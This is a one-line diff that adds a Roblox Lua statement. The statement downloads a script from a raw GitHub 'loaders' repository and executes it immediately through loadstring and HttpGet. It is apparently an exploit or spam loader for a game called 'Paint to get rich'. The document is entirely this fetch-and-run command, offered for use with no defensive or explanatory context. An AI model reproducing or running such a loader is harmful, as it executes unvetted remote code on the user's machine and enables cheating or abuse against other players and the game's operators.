@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AssemblyLook/loaders/main/loaders/now-paint-to-get-rich-spam4-n95kdq07igm1ot.lua"))()
